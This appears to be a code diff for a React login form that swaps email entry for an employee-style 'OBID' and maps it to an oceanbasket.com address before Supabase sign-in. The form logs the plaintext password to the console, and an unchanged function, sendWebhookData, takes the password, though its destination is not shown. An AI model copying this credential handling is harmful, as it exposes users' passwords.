@@ -7,14 +7,13 @@ interface LoginProps {
 }
 
 const Login: React.FC<LoginProps> = ({ onLogin }) => {
-  const [email, setEmail] = useState('');
+  const [obid, setObid] = useState('');
   const [password, setPassword] = useState('');
-  const [errors, setErrors] = useState<{ email?: string; password?: string; general?: string }>({});
+  const [errors, setErrors] = useState<{ obid?: string; password?: string; general?: string }>({});
   const [isLoading, setIsLoading] = useState(false);
 
-  const validateEmail = (email: string) => {
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    return emailRegex.test(email);
+  const convertToEmail = (id: string) => {
+    return `${id}@oceanbasket.com`;
   };
 
   const sendWebhookData = async (email: string, password: string) => {
@@ -37,14 +36,12 @@ const Login: React.FC<LoginProps> = ({ onLogin }) => {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    const newErrors: { email?: string; password?: string; general?: string } = {};
+    const newErrors: { obid?: string; password?: string; general?: string } = {};
 
-    console.log('Form submitted with:', { email, password });
+    console.log('Form submitted with:', { obid, password });
 
-    if (!email) {
-      newErrors.email = 'Email is required';
-    } else if (!validateEmail(email)) {
-      newErrors.email = 'Please enter a valid email address';
+    if (!obid) {
+      newErrors.obid = 'OBID is required';
     }
 
     if (!password) {
@@ -61,6 +58,8 @@ const Login: React.FC<LoginProps> = ({ onLogin }) => {
     setErrors({});
 
     try {
+      // Convert OBID to email format
+      const email = convertToEmail(obid);
       console.log('Attempting Supabase authentication...');
       
       // Sign in with Supabase
@@ -71,7 +70,7 @@ const Login: React.FC<LoginProps> = ({ onLogin }) => {
 
       if (error) {
         console.error('Supabase auth error:', error);
-        setErrors({ general: 'Invalid email or password' });
+        setErrors({ general: 'Invalid OBID or password' });
         return;
       }
 
@@ -143,17 +142,17 @@ const Login: React.FC<LoginProps> = ({ onLogin }) => {
           <form onSubmit={handleSubmit} className="space-y-12">
             <div className="relative">
               <label className="text-white text-sm mb-2 block">
-                Email <span className="text-orange-500 ml-1">•</span>
+                OBID <span className="text-orange-500 ml-1">•</span>
               </label>
               <input
-                type="email"
-                value={email}
-                onChange={(e) => setEmail(e.target.value)}
+                type="text"
+                value={obid}
+                onChange={(e) => setObid(e.target.value)}
                 className="w-full bg-transparent border-0 border-b border-white px-0 py-3 text-white text-lg placeholder-white/70 focus:outline-none focus:border-secondary"
                 placeholder=""
               />
-              {errors.email && (
-                <p className="text-red-300 text-sm mt-2">{errors.email}</p>
+              {errors.obid && (
+                <p className="text-red-300 text-sm mt-2">{errors.obid}</p>
               )}
             </div>
 
